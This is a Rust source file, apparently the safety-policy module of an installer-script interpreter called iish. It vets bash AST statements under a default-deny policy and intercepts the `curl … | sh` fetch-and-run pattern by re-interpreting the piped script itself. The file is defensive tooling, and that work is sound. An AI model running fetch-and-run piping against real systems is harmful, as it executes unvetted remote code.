//! The safety policy: decides, per parsed statement, whether iish will
//! run it, ask the user first, or refuse — and compiles the allowed
//! ones into [`Action`]s for native execution.
//!
//! Default deny. The evaluator walks brush-parser's real bash AST
//! (`parser::ast`) and only allows the specific shapes it recognizes as
//! safe installer operations; every construct it does not yet implement
//! — pipelines, some redirections, some expansions, and so on — is
//! denied here. This is the "if we didn't understand it, we don't run
//! it" posture the old hand-rolled parser used to enforce by refusing
//! to tokenize; now that parsing covers the full grammar, the evaluator
//! enforces it instead.

use crate::config::{Config, NetworkPolicy, Verb};
use crate::exec::{Action, FetchOutput, LookupStyle, Mode, StderrDest, StdoutDest};
use crate::parser::{ast, case_pattern_word, glob_match, literal_word, word_fields, ExpandCtx};
use crate::state;
use std::fs;
use std::path::{Path, PathBuf};

/// A control-flow builtin (`return`/`exit`/`break`/`continue`): not an
/// [`Action`] — it doesn't *do* anything — but a signal the runner
/// unwinds to the right boundary (the enclosing function call, loop, or
/// the whole run).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Flow {
    /// `return [n]`: end the innermost function call with status `n`.
    Return(i32),
    /// `exit [n]`: end the whole run with status `n`.
    Exit(u8),
    /// `break [n]`: leave `n` levels of enclosing loop.
    Break(u32),
    /// `continue [n]`: next iteration of the `n`th enclosing loop.
    Continue(u32),
}

/// Not `PartialEq`/`Eq`: several variants carry `brush_parser::ast`
/// nodes, which only derive those outside of brush-parser's own test
/// build. Nothing here ever compares two `Verdict`s, so this costs
/// nothing.
#[derive(Debug, Clone)]
pub enum Verdict {
    /// Safe to execute; `action` is the compiled operation.
    Allow { reason: String, action: Action },
    /// Possibly fine, but the user must confirm on /dev/tty first
    /// (e.g. overwriting a pre-existing file).
    Prompt { reason: String, action: Action },
    /// Refused.
    Deny { reason: String },
    /// A brace group or a matched `case` arm: not a single compiled
    /// `Action`, but a nested statement list that the runner must
    /// evaluate and execute one statement at a time against the *same*
    /// live session — exactly like top-level statements — because a
    /// later statement's verdict can depend on ledger changes an
    /// earlier one in the same group made.
    Group {
        statements: Vec<ast::CompoundListItem>,
    },
    /// A call to a function defined earlier in the run: like `Group`,
    /// but the runner brackets the body in a call frame so `args`
    /// become the body's `$1`/`$@`/`$#`, `local` declarations scope to
    /// the call, and `return` unwinds to exactly here.
    Call {
        name: String,
        args: Vec<String>,
        body: Vec<ast::CompoundListItem>,
    },
    /// `if`/`elif`/`else`/`fi`: unlike `Group`, which branch (if any)
    /// runs depends on the actual exit status of `condition` — which may
    /// itself run a subprocess with real side effects — so this can't be
    /// resolved to a fixed statement list here. The runner evaluates
    /// `condition` statement by statement against the live session
    /// exactly like a top-level list, checks the last one's exit status,
    /// and only then recurses into `then_branch` or the matching `elses`
    /// clause.
    If {
        condition: Vec<ast::CompoundListItem>,
        then_branch: Vec<ast::CompoundListItem>,
        elses: Option<Vec<ast::ElseClause>>,
    },
    /// `for NAME in words...; do ...; done`. The word list is kept
    /// unexpanded: the runner expands it (`word_fields`, so `"$@"` and
    /// field splitting behave) at the moment the loop starts, then runs
    /// `body` once per resulting field with NAME assigned. `values` of
    /// `None` is the `for NAME; do` shorthand for iterating `"$@"`.
    For {
        variable: String,
        values: Option<Vec<ast::Word>>,
        body: Vec<ast::CompoundListItem>,
    },
    /// `while`/`until cond; do ...; done`: the runner alternates
    /// `condition` (exempt from abort-on-failure, like `if`'s) and
    /// `body` until the condition says stop — inverted for `until` —
    /// with an iteration ceiling turning a runaway loop into a refusal.
    While {
        condition: Vec<ast::CompoundListItem>,
        body: Vec<ast::CompoundListItem>,
        until: bool,
    },
    /// `first && second || third ...`: like `If`'s condition, whether
    /// `second`/`third`/... even run depends on the real exit status of
    /// what came before, so this can't be resolved to a fixed action
    /// here either. The runner evaluates `first`, then walks `rest`
    /// left to right, running each pipeline only if its operator's
    /// short-circuit condition is met (`&&` — the status so far was
    /// success; `||` — it wasn't); the list's own status is whichever
    /// pipeline ran last.
    AndOrList {
        first: ast::Pipeline,
        rest: Vec<ast::AndOr>,
    },
    /// `! pipeline`: run the (bang-stripped) pipeline for its status
    /// and report the logical negation. Never aborts the run on its own
    /// — bash exempts `!`-prefixed pipelines from `errexit` entirely.
    Not { pipeline: Box<ast::Pipeline> },
    /// `first | second | ...`: a real multi-stage pipeline. The runner
    /// evaluates each stage against the live session at its turn (so a
    /// stage is vetted by exactly the policy it would face standing
    /// alone) and runs them *sequentially*, buffering each stage's
    /// captured stdout as the next stage's stdin — installers pipe
    /// small probe output (`uname -s | tr ...`, `echo $path | grep
    /// ...`), not unbounded streams, and buffering keeps every stage's
    /// policy decision strictly ordered. The pipeline's status is the
    /// last stage's, as in bash without `pipefail`.
    Pipe { stages: Vec<ast::Command> },
    /// `producer … | sh` — the `curl … | sh` pattern. Its whole reason
    /// to exist is to hand a downloaded script to a shell; iish's whole
    /// reason to exist is to *be* that safe target. So instead of
    /// refusing, the runner runs `producer` (the stages before the
    /// shell), captures their combined stdout, and feeds that text back
    /// into iish's own interpreter as a sub-context — every statement
    /// vetted by the same policy, prompts and refusals intact. It is not
    /// a pass-through to a real shell (there is none); it is recursion
    /// into iish, the same recursive transparency command substitution
    /// and `sudo sh -c` already have. The sub-script runs in the same
    /// session but with subshell-style `exit` semantics: its own `exit`
    /// ends only the sub-context (becoming the pipeline's status), while
    /// a refusal inside it still aborts the whole run.
    PipeToShell {
        producer: Vec<ast::Command>,
        shell: String,
    },
    /// `return`/`exit`/`break`/`continue`.
    ControlFlow(Flow),
    /// `( ... )`: a subshell. The runner evaluates and runs `statements`
    /// against a snapshot of the session, discarding their
    /// variable/function/frame/`set -u` and working-directory changes on
    /// exit (bash subshell isolation) but keeping real filesystem
    /// effects. Its own `exit` ends only the subshell.
    Subshell {
        statements: Vec<ast::CompoundListItem>,
    },
}

fn allow(reason: impl Into<String>, action: Action) -> Verdict {
    Verdict::Allow {
        reason: reason.into(),
        action,
    }
}

fn prompt(reason: impl Into<String>, action: Action) -> Verdict {
    Verdict::Prompt {
        reason: reason.into(),
        action,
    }
}

fn deny(reason: impl Into<String>) -> Verdict {
    Verdict::Deny {
        reason: reason.into(),
    }
}

/// One top-level statement in the script, together with its verdict.
pub struct Statement {
    /// The statement reconstructed from the AST, for display.
    pub raw: String,
    pub verdict: Verdict,
}

/// The top-level statements of a parsed program, in source order. Each
/// must be evaluated against the ledger as it stands when execution
/// reaches it, so callers iterate these and call [`evaluate_item`] one
/// statement at a time. Owned (cloned out of `program`) so the runner
/// can walk this list with the exact same recursive helper it uses for
/// a `Verdict::Group`'s nested statements, which have no `program` of
/// their own to borrow from (they come from a brace-group node or a
/// stored function body).
pub fn items(program: &ast::Program) -> Vec<ast::CompoundListItem> {
    program
        .complete_commands
        .iter()
        .flat_map(|list| list.0.iter().cloned())
        .collect()
}

/// Evaluate one top-level statement against the policy, the current
/// session (through `ctx`, which also carries the command-substitution
/// callback expansion may need), and the effective configuration.
pub fn evaluate_item(
    item: &ast::CompoundListItem,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Statement {
    Statement {
        raw: item.0.to_string(),
        verdict: evaluate_list_item(item, ctx, config),
    }
}

fn evaluate_list_item(
    item: &ast::CompoundListItem,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Verdict {
    let ast::CompoundListItem(and_or, separator) = item;
    if matches!(separator, ast::SeparatorOperator::Async) {
        return deny("background jobs (`&`) are not implemented yet");
    }
    evaluate_and_or_list(and_or, ctx, config)
}

fn evaluate_and_or_list(list: &ast::AndOrList, ctx: &mut ExpandCtx, config: &Config) -> Verdict {
    if list.additional.is_empty() {
        evaluate_pipeline(&list.first, ctx, config)
    } else {
        Verdict::AndOrList {
            first: list.first.clone(),
            rest: list.additional.clone(),
        }
    }
}

/// Evaluate a single pipeline from inside an `AndOrList`'s chain — the
/// runner's counterpart to [`evaluate_item`], at pipeline rather than
/// whole-statement granularity, since a `&&`/`||` chain must decide
/// each pipeline's policy one at a time as it actually runs it (a later
/// pipeline may depend on ledger changes an earlier one made).
pub fn evaluate_pipeline_item(
    pipeline: &ast::Pipeline,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Statement {
    Statement {
        raw: pipeline.to_string(),
        verdict: evaluate_pipeline(pipeline, ctx, config),
    }
}

fn evaluate_pipeline(pipeline: &ast::Pipeline, ctx: &mut ExpandCtx, config: &Config) -> Verdict {
    if pipeline.timed.is_some() {
        return deny("`time` is not implemented yet");
    }
    if pipeline.bang {
        // Hand the runner the same pipeline minus its `!` so it can run
        // it for a status and negate; the negation itself never aborts.
        let mut inner = pipeline.clone();
        inner.bang = false;
        return Verdict::Not {
            pipeline: Box::new(inner),
        };
    }
    match pipeline.seq.as_slice() {
        [] => deny("empty pipeline"),
        [only] => evaluate_command(only, ctx, config),
        stages => {
            // A shell as the *last* stage is `curl … | sh`: rather than
            // refuse, iish runs the producer stages, captures their
            // output, and interprets that script itself — the "sub-iish"
            // (see `Verdict::PipeToShell`). A shell anywhere *earlier* in
            // the chain would be reading another command's output as its
            // program mid-pipeline, which iish has no coherent handling
            // for; refuse that.
            let (last, producer) = stages.split_last().expect("stages is non-empty");
            if producer.iter().any(is_shell_invocation) {
                return deny("piping through a shell in the middle of a pipeline is not supported");
            }
            match shell_stdin_target(last) {
                Some(Ok(shell)) => Verdict::PipeToShell {
                    producer: producer.to_vec(),
                    shell,
                },
                Some(Err(reason)) => deny(reason),
                None => Verdict::Pipe {
                    stages: stages.to_vec(),
                },
            }
        }
    }
}

/// If `cmd` is a shell reading its program from stdin — the receiving
/// end of `curl … | sh` — return `Some(Ok(shell_name))`. A shell with
/// arguments beyond the stdin flag (`-s`) is a different shape iish
/// doesn't map cleanly yet, so it returns `Some(Err(reason))`. A
/// non-shell command returns `None`.
fn shell_stdin_target(cmd: &ast::Command) -> Option<Result<String, String>> {
    let ast::Command::Simple(sc) = cmd else {
        return None;
    };
    let name = sc.word_or_name.as_ref()?;
    if !is_shell_name(&name.value) {
        return None;
    }
    // Any suffix word other than `-s` (read from stdin) means the shell
    // is being told to do something more specific (`-c 'cmd'`, a script
    // path, positional args) that "interpret the piped script" doesn't
    // capture. Only a redirect-free bare/`-s` invocation is handled.
    if let Some(suffix) = &sc.suffix {
        for item in &suffix.0 {
            match item {
                ast::CommandPrefixOrSuffixItem::Word(w) if w.value == "-s" => {}
                ast::CommandPrefixOrSuffixItem::Word(w) => {
                    return Some(Err(format!(
                        "`{} {}` after a pipe is not supported; only a bare `{}` (or `{} -s`) \
                         that runs the piped script is",
                        name.value, w.value, name.value, name.value
                    )));
                }
                _ => {
                    return Some(Err(format!(
                        "`{}` with a redirect or assignment after a pipe is not supported",
                        name.value
                    )));
                }
            }
        }
    }
    Some(Ok(name.value.clone()))
}

/// Evaluate one stage of a multi-stage pipeline at the moment the
/// runner reaches it — the `Verdict::Pipe` counterpart to
/// [`evaluate_pipeline_item`].
pub fn evaluate_pipe_stage(
    stage: &ast::Command,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Statement {
    Statement {
        raw: stage.to_string(),
        verdict: evaluate_command(stage, ctx, config),
    }
}

/// True if `cmd` is a bare invocation of a shell — the `| sh` half of
/// the `curl | sh` anti-pattern iish exists to intercept.
fn is_shell_invocation(cmd: &ast::Command) -> bool {
    let ast::Command::Simple(sc) = cmd else {
        return false;
    };
    sc.word_or_name
        .as_ref()
        .map(|w| is_shell_name(&w.value))
        .unwrap_or(false)
}

fn is_shell_name(name: &str) -> bool {
    matches!(name, "sh" | "bash" | "zsh" | "dash" | "ksh")
}

fn evaluate_command(cmd: &ast::Command, ctx: &mut ExpandCtx, config: &Config) -> Verdict {
    match cmd {
        ast::Command::Simple(sc) => evaluate_simple_command(sc, ctx, config),
        ast::Command::Function(def) => evaluate_function_definition(def, ctx),
        ast::Command::ExtendedTest(_, redirects) => {
            if redirects.is_some() {
                return deny("redirection is not implemented yet");
            }
            deny("`[[ ]]` extended test is not implemented yet")
        }
        ast::Command::Compound(compound, redirects) => {
            // Discard-shaped redirects on a compound command (atuin's
            // `{ true < /dev/tty; } 2> /dev/null` interactivity probe,
            // `if ...; fi > /dev/null`, ...) are accepted and ignored:
            // iish's native actions don't write the script's output to
            // stderr, and suppressing a subprocess's chatter inside is
            // cosmetic. Anything that would *redirect to a real file*
            // stays denied.
            if let Some(redirect_list) = redirects {
                if !redirect_list
                    .0
                    .iter()
                    .all(|r| is_ignorable_compound_redirect(r, ctx))
                {
                    return deny(
                        "redirection on a compound command is only implemented for \
                         discard shapes (`> /dev/null`, `2> /dev/null`, `2>&1`)",
                    );
                }
            }
            match compound {
                // `{ ...; }`: not a policy-gated operation in itself —
                // it just sequences the statements inside it, which the
                // runner evaluates one at a time against the same live
                // session a top-level statement would see.
                ast::CompoundCommand::BraceGroup(group) => Verdict::Group {
                    statements: group.list.0.clone(),
                },
                ast::CompoundCommand::IfClause(if_clause) => evaluate_if(if_clause),
                ast::CompoundCommand::CaseClause(case_clause) => evaluate_case(case_clause, ctx),
                ast::CompoundCommand::ForClause(for_clause) => Verdict::For {
                    variable: for_clause.variable_name.clone(),
                    values: for_clause.values.clone(),
                    body: for_clause.body.list.0.clone(),
                },
                ast::CompoundCommand::WhileClause(clause) => Verdict::While {
                    condition: clause.0 .0.clone(),
                    body: clause.1.list.0.clone(),
                    until: false,
                },
                ast::CompoundCommand::UntilClause(clause) => Verdict::While {
                    condition: clause.0 .0.clone(),
                    body: clause.1.list.0.clone(),
                    until: true,
                },
                // `( ... )`: a subshell. Like a brace group, but the
                // runner brackets it so variable/function/frame/`set -u`
                // changes inside don't leak out (bash subshell semantics)
                // and its own `exit` ends only the subshell. Real
                // filesystem effects persist, exactly as in bash.
                ast::CompoundCommand::Subshell(subshell) => Verdict::Subshell {
                    statements: subshell.list.0.clone(),
                },
                other => deny(format!("{} are not implemented yet", compound_kind(other))),
            }
        }
    }
}

/// `name() { ... }` / `function name { ... }`: registers `name` so a
/// later call runs the body — nothing in the body runs now. Only a
/// plain brace-group body with no redirects is supported; a subshell
/// body (`name() ( ... )`) or one with its own redirects would need
/// machinery (subshell isolation, redirect handling) iish doesn't have.
fn evaluate_function_definition(def: &ast::FunctionDefinition, ctx: &mut ExpandCtx) -> Verdict {
    let name = match literal_word(&def.fname, ctx) {
        Ok(n) => n,
        Err(reason) => return deny(reason),
    };
    let ast::FunctionBody(compound, redirects) = &def.body;
    if redirects.is_some() {
        return deny("redirection on a function body is not implemented yet");
    }
    let ast::CompoundCommand::BraceGroup(group) = compound else {
        return deny(format!(
            "a function body that is {} (rather than a `{{ ... }}` brace group) is not \
             implemented yet",
            compound_kind(compound)
        ));
    };
    allow(
        format!("registers `{name}`; its body is only as safe as what it does, checked statement by statement when called"),
        Action::DefineFunction {
            name,
            body: group.list.clone(),
        },
    )
}

/// `if condition; then ...; elif ...; else ...; fi`: just repackages the
/// AST's own condition/then/elses lists into `Verdict::If`. Nothing here
/// runs or is even checked for safety yet — the runner (main.rs) walks
/// `condition` first, statement by statement against the live session,
/// before it knows which branch (if any) to evaluate next.
fn evaluate_if(if_clause: &ast::IfClauseCommand) -> Verdict {
    Verdict::If {
        condition: if_clause.condition.0.clone(),
        then_branch: if_clause.then.0.clone(),
        elses: if_clause.elses.clone(),
    }
}

/// `case value in pat1) ...;; pat2|pat3) ...;; esac`: unlike `if`,
/// matching a `case` value against its patterns has no side effects
/// beyond what the value/pattern words' own expansions do, so (like
/// `mkdir`'s "does this path exist?" check) it can be resolved right
/// here: render `value` as a literal word, walk the arms in order,
/// and once one matches, hand its body back as an ordinary `Verdict::Group`
/// — the runner doesn't need to know it came from a `case` at all. No
/// arm matching falls through to a no-op, matching real `case`'s exit
/// status of 0 when nothing matches.
fn evaluate_case(case: &ast::CaseClauseCommand, ctx: &mut ExpandCtx) -> Verdict {
    let value = match literal_word(&case.value, ctx) {
        Ok(v) => v,
        Err(reason) => return deny(reason),
    };
    // Every arm must use a plain `;;`: `;&`/`;;&` fall through to a
    // sibling arm's body (possibly skipping or re-running its pattern
    // check), which would require running more than the one matched arm
    // — checked up front, across every arm, so which arm ends up
    // matching can't silently change what "this construct is fully
    // understood" means.
    if case
        .cases
        .iter()
        .any(|item| !matches!(item.post_action, ast::CaseItemPostAction::ExitCase))
    {
        return deny("`;&`/`;;&` case fallthrough is not implemented yet");
    }
    for item in &case.cases {
        for pattern_word in &item.patterns {
            let pattern = match case_pattern_word(pattern_word, ctx) {
                Ok(p) => p,
                Err(reason) => return deny(reason),
            };
            if glob_match(&pattern, &value) {
                let statements = item.cmd.as_ref().map(|c| c.0.clone()).unwrap_or_default();
                return Verdict::Group { statements };
            }
        }
    }
    allow("no case pattern matched; case is a no-op", Action::Noop)
}

fn compound_kind(compound: &ast::CompoundCommand) -> &'static str {
    match compound {
        ast::CompoundCommand::Arithmetic(_) => "arithmetic commands",
        ast::CompoundCommand::ArithmeticForClause(_) => "arithmetic for-loops",
        ast::CompoundCommand::BraceGroup(_) => "brace groups",
        ast::CompoundCommand::Subshell(_) => "subshells",
        ast::CompoundCommand::ForClause(_) => "for-loops",
        ast::CompoundCommand::CaseClause(_) => "case statements",
        ast::CompoundCommand::IfClause(_) => "if statements",
        ast::CompoundCommand::WhileClause(_) => "while-loops",
        ast::CompoundCommand::UntilClause(_) => "until-loops",
        ast::CompoundCommand::Coprocess(_) => "coprocesses",
    }
}

/// `VAR=value [VAR2=value2 ...]` with no command word: assigns one or
/// more shell variables tracked for the rest of this run (parser.rs
/// reads them back for a later `$VAR`/`${VAR}` expansion) and nothing
/// else — no filesystem or process side effects, so always allowed once
/// every value renders as a literal word. Each value is rendered
/// against the session as it stood *before* this statement, so (unlike
/// real bash) a later assignment on the same line can't yet see an
/// earlier one's freshly-set value — a rare enough shape in practice
/// that it isn't worth the added complexity here. `VAR+=value`
/// (appending), array-element (`VAR[i]=value`), and array-valued
/// (`VAR=(a b c)`) assignments aren't implemented.
fn evaluate_bare_assignment(
    items: &[ast::CommandPrefixOrSuffixItem],
    ctx: &mut ExpandCtx,
) -> Verdict {
    let mut assignments = Vec::with_capacity(items.len());
    for item in items {
        let ast::CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) = item else {
            return deny("bare variable assignment is not implemented yet");
        };
        match assignment_name_and_value(assignment, ctx) {
            Ok(pair) => assignments.push(pair),
            Err(reason) => return deny(reason),
        }
    }
    allow(
        "assigns only literal values to shell variables tracked for this run; no filesystem \
         or process side effects",
        Action::Assign { assignments },
    )
}

/// The `(name, rendered value)` of one `NAME=value` assignment word,
/// shared by bare assignment and `local`.
fn assignment_name_and_value(
    assignment: &ast::Assignment,
    ctx: &mut ExpandCtx,
) -> Result<(String, String), String> {
    if assignment.append {
        return Err(
            "`VAR+=value` (appending to an existing variable) is not implemented yet".into(),
        );
    }
    let name = match &assignment.name {
        ast::AssignmentName::VariableName(name) => name.clone(),
        ast::AssignmentName::ArrayElementName(..) => {
            return Err("array element assignment (`VAR[i]=value`) is not implemented yet".into())
        }
    };
    let ast::AssignmentValue::Scalar(word) = &assignment.value else {
        return Err("array-valued assignment (`VAR=(a b c)`) is not implemented yet".into());
    };
    let value = literal_word(word, ctx)?;
    Ok((name, value))
}

/// The redirects a statement carried that iish understands beyond the
/// `>>` env-file append: where stdout and stderr should go, and an
/// optional `< /dev/tty`/`< /dev/null` stdin probe (see
/// `evaluate_argv`).
#[derive(Debug, Clone, Default)]
struct Redirects {
    stdout: StdoutDest,
    stderr: StderrDest,
    stdin_probe: Option<String>,
}

/// True if `r` is a redirect a compound command may carry and have
/// ignored (see `evaluate_command`): any of the recognized
/// stdout/stderr discard shapes, but not `>>` (a real write).
fn is_ignorable_compound_redirect(r: &ast::IoRedirect, ctx: &mut ExpandCtx) -> bool {
    let mut scratch = Redirects::default();
    let mut append: Option<&ast::Word> = None;
    note_redirect(r, &mut append, &mut scratch, ctx) && append.is_none()
}

fn evaluate_simple_command(
    cmd: &ast::SimpleCommand,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Verdict {
    if cmd.word_or_name.is_none() {
        // A bare `VAR=value [VAR2=value2 ...]` statement: no command to
        // run at all, just one or more assignments. `cmd.prefix` is
        // guaranteed non-empty by the grammar whenever there's no
        // command word.
        let items = cmd.prefix.as_ref().map(|p| p.0.as_slice()).unwrap_or(&[]);
        return evaluate_bare_assignment(items, ctx);
    }
    if let Some(prefix) = &cmd.prefix {
        if !prefix.0.is_empty() {
            return deny("`VAR=value` prefix assignments are not implemented yet");
        }
    }

    // The command word is field-expanded too: `"$@"` (or a
    // whitespace-separated `$CMD`) as the command position — rustup's
    // `ensure mktemp -d` runs `"$@"` — yields the command name *and*
    // its leading arguments. It can also expand to *nothing* (an empty
    // `${sudo}` in starship's `${sudo} tar …`), in which case bash skips
    // it and the command comes from the first following word — so the
    // command name is only resolved once every word is expanded.
    let name_word = cmd.word_or_name.as_ref().unwrap();
    let mut words: Vec<String> = match word_fields(name_word, ctx) {
        Ok(fields) => fields,
        Err(reason) => return deny(reason),
    };
    // Assignment-shaped suffix items (`local x=1`) are collected
    // separately; they're only meaningful for `local`, resolved below
    // once the command name is known.
    let mut assignment_args: Vec<(String, String)> = Vec::new();
    // The redirect shapes iish understands: a single `>>` onto a plain
    // filename (the env-file append grammar), `> /dev/null` and
    // `2> /dev/null` (discarding writes nothing anywhere, so there is
    // no path or content to vet), `2>&1` (stderr follows stdout), and
    // `>&2` (stdout joins iish's own stderr). Anything else (other fds,
    // `<`, `>`/`2>` onto a real file, heredocs, process substitution as
    // a redirect target, ...) is denied below.
    let mut append_target: Option<&ast::Word> = None;
    let mut heredoc: Option<&ast::IoHereDocument> = None;
    let mut redirects = Redirects::default();
    let mut unsupported_redirect = false;
    if let Some(suffix) = &cmd.suffix {
        for item in &suffix.0 {
            match item {
                ast::CommandPrefixOrSuffixItem::Word(w) => match word_fields(w, ctx) {
                    Ok(fields) => words.extend(fields),
                    Err(reason) => return deny(reason),
                },
                ast::CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) => {
                    match assignment_name_and_value(assignment, ctx) {
                        Ok(pair) => assignment_args.push(pair),
                        Err(reason) => return deny(reason),
                    }
                }
                ast::CommandPrefixOrSuffixItem::IoRedirect(ast::IoRedirect::HereDocument(
                    None | Some(0),
                    doc,
                )) if heredoc.is_none() => {
                    heredoc = Some(doc);
                }
                ast::CommandPrefixOrSuffixItem::IoRedirect(r) => {
                    if !note_redirect(r, &mut append_target, &mut redirects, ctx) {
                        unsupported_redirect = true;
                    }
                }
                ast::CommandPrefixOrSuffixItem::ProcessSubstitution(..) => {
                    return deny("process substitution is not implemented yet");
                }
            }
        }
    }

    // With every word expanded, the first field is the command name. If
    // there is none, the whole line expanded to nothing (e.g. an empty
    // `${x}`) — bash runs nothing and succeeds.
    let Some((name, arg_words)) = words.split_first() else {
        if assignment_args.is_empty() {
            return allow("expanded to no command; nothing to run", Action::Noop);
        }
        return deny("`VAR=value` prefix assignments are not implemented yet");
    };
    let name = name.clone();
    let mut args: Vec<String> = arg_words.to_vec();
    // Assignment-shaped arguments are only meaningful for `local`; hand
    // it the rendered `NAME=value` text and let `evaluate_local` take it
    // apart. For anything else they'd be a prefix assignment iish
    // doesn't implement.
    if !assignment_args.is_empty() {
        if name == "local" {
            for (n, v) in assignment_args {
                args.push(format!("{n}={v}"));
            }
        } else {
            return deny("assignment arguments are not implemented yet");
        }
    }

    if unsupported_redirect {
        return deny(
            "redirection is only implemented for a single `>>` onto a plain filename \
             (see the env-file append grammar), `> /dev/null`, `2> /dev/null`, `2>&1`, \
             and `>&2`",
        );
    }

    if let Some(doc) = heredoc {
        // The one here-document idiom installers actually use: `cat <<
        // EOF` printing a banner/usage block. `cat` copying its stdin
        // to stdout *is* printing the body, so it compiles to the same
        // native Print as `echo` — no subprocess, no prompt.
        if name != "cat" || !args.is_empty() || append_target.is_some() {
            return deny(
                "here-documents are only implemented for a bare `cat << EOF` printing a banner",
            );
        }
        return evaluate_cat_heredoc(doc, redirects.stdout);
    }

    match append_target {
        None => evaluate_argv(&name, &args, redirects, ctx, config, false),
        Some(target) if matches!(name.as_str(), "echo" | "printf") => {
            evaluate_env_file_append(&name, &args, target, ctx, config)
        }
        Some(_) => deny(format!(
            "redirecting `{name}`'s output is not implemented yet"
        )),
    }
}

/// `cat << EOF ... EOF`: print the body. A `<<-` strips leading tabs,
/// as in a real shell. A body that would need expansion (`$VAR` or a
/// backquote under an unquoted delimiter) is refused rather than
/// printed wrong — installers' banners are plain text.
fn evaluate_cat_heredoc(doc: &ast::IoHereDocument, dest: StdoutDest) -> Verdict {
    let mut text = doc.doc.value.clone();
    if doc.remove_tabs {
        text = text
            .split_inclusive('\n')
            .map(|line| line.trim_start_matches('\t'))
            .collect();
    }
    if doc.requires_expansion && text.contains(['$', '`']) {
        return deny("a here-document containing expansions is not implemented yet");
    }
    allow(
        "prints the here-document body only",
        Action::Print { text, dest },
    )
}

/// Record one redirect into `append_target`/`redirects` if it's a shape
/// iish understands (returning false for anything else). Repeats of the
/// same slot are unsupported too — a second `>>`, two stdout
/// redirections, ... — with one exception: bash processes redirects
/// left to right, but iish's model only tracks final destinations, so
/// order-sensitive combinations beyond the ubiquitous
/// `> /dev/null 2>&1` aren't distinguished.
fn note_redirect<'a>(
    r: &'a ast::IoRedirect,
    append_target: &mut Option<&'a ast::Word>,
    redirects: &mut Redirects,
    ctx: &mut ExpandCtx,
) -> bool {
    use ast::{IoFileRedirectKind as Kind, IoFileRedirectTarget as Target, IoRedirect};
    let target_is_dev_null = |target: &ast::Word, ctx: &mut ExpandCtx| {
        literal_word(target, ctx).ok().as_deref() == Some("/dev/null")
    };
    match r {
        IoRedirect::File(None, Kind::Append, Target::Filename(target))
            if append_target.is_none() =>
        {
            *append_target = Some(target);
            true
        }
        IoRedirect::File(None | Some(1), Kind::Write, Target::Filename(target))
            if redirects.stdout == StdoutDest::Inherit && target_is_dev_null(target, ctx) =>
        {
            redirects.stdout = StdoutDest::Null;
            true
        }
        IoRedirect::File(Some(2), Kind::Write, Target::Filename(target))
            if redirects.stderr == StderrDest::Inherit && target_is_dev_null(target, ctx) =>
        {
            redirects.stderr = StderrDest::Null;
            true
        }
        IoRedirect::File(Some(2), Kind::DuplicateOutput, target)
            if redirects.stderr == StderrDest::Inherit && duplicates_fd(target, 1) =>
        {
            redirects.stderr = StderrDest::Stdout;
            true
        }
        IoRedirect::File(None | Some(1), Kind::DuplicateOutput, target)
            if redirects.stdout == StdoutDest::Inherit && duplicates_fd(target, 2) =>
        {
            redirects.stdout = StdoutDest::Stderr;
            true
        }
        IoRedirect::File(None | Some(0), Kind::Read, Target::Filename(target))
            if redirects.stdin_probe.is_none() =>
        {
            match literal_word(target, ctx).ok().as_deref() {
                Some(path @ ("/dev/null" | "/dev/tty")) => {
                    redirects.stdin_probe = Some(path.to_string());
                    true
                }
                _ => false,
            }
        }
        _ => false,
    }
}

/// Does this `>&` target name file descriptor `fd`? brush encodes
/// `2>&1` as either an `Fd` target or (in word form) a `Duplicate`
/// word, depending on how it was written.
fn duplicates_fd(target: &ast::IoFileRedirectTarget, fd: i32) -> bool {
    match target {
        ast::IoFileRedirectTarget::Fd(n) => *n == fd,
        ast::IoFileRedirectTarget::Duplicate(word) => word.value == fd.to_string(),
        _ => false,
    }
}

fn evaluate_argv(
    name: &str,
    args: &[String],
    redirects: Redirects,
    ctx: &mut ExpandCtx,
    config: &Config,
    skip_functions: bool,
) -> Verdict {
    // A function defined earlier in the run shadows everything below,
    // exactly as it would in bash (function lookup happens before
    // builtins or a $PATH search) — unless this dispatch came through
    // `command NAME`, whose entire point is to skip that shadowing.
    // (A redirect on the call itself, e.g. `has_local 2> /dev/null`,
    // applies to nothing here: the body's own statements are vetted
    // and run individually.)
    if !skip_functions {
        if let Some(body) = ctx.session.lookup_function(name) {
            return Verdict::Call {
                name: name.to_string(),
                args: args.to_vec(),
                body: body.0.clone(),
            };
        }
    }

    if config.command_override(name) == Some(Verb::Deny) {
        return deny(format!("`{name}` is denied by configuration"));
    }

    // `< /dev/tty` exists in installers as exactly one idiom: `true <
    // /dev/tty`, probing whether a controlling terminal can be opened
    // (atuin's interactivity check). That probe is implemented; feeding
    // the terminal to anything else is not. `< /dev/null` reads
    // nothing, so elsewhere it's satisfied by doing nothing.
    if let Some(path) = &redirects.stdin_probe {
        if matches!(name, "true" | ":") {
            return allow(
                format!("succeeds only if `{path}` can be opened for reading; reads nothing"),
                Action::ProbeRead {
                    path: PathBuf::from(path),
                },
            );
        }
        if path == "/dev/tty" && name != "read" {
            return deny(
                "`< /dev/tty` is only implemented for `true` (the interactivity probe) and \
                 `read` (a y/n question)",
            );
        }
    }

    // Native implementations ignore a stdout/stderr redirect they have
    // no output for (discarding nothing is a no-op — same treatment
    // `2> /dev/null` has had since it landed); the ones that do print
    // (`echo`/`printf`, `command -v`/`type`, the subprocess tier)
    // honor it.
    match name {
        "true" | ":" => allow("does nothing", Action::Noop),
        "false" => allow(
            "does nothing, unsuccessfully",
            Action::Test { result: false },
        ),
        "echo" => evaluate_echo(args, redirects.stdout),
        "printf" => evaluate_printf(args, redirects.stdout),
        "mkdir" => evaluate_mkdir(args),
        "touch" => evaluate_touch(args, ctx, config),
        "rm" => evaluate_rm(args, ctx),
        "chmod" => evaluate_chmod(args, ctx),
        "cp" => evaluate_cp(args, ctx, config),
        "curl" => evaluate_curl(args, ctx, config),
        "wget" => evaluate_wget(args, ctx, config),
        "sha256sum" => evaluate_sha256sum(args, ctx),
        "set" => evaluate_set(args),
        "test" => evaluate_test(args),
        "[" => evaluate_bracket(args),
        "local" => evaluate_local(args, ctx),
        "cd" => evaluate_cd(args),
        "read" => evaluate_read(args, &redirects),
        "shift" => evaluate_shift(args),
        "unset" => evaluate_unset(args),
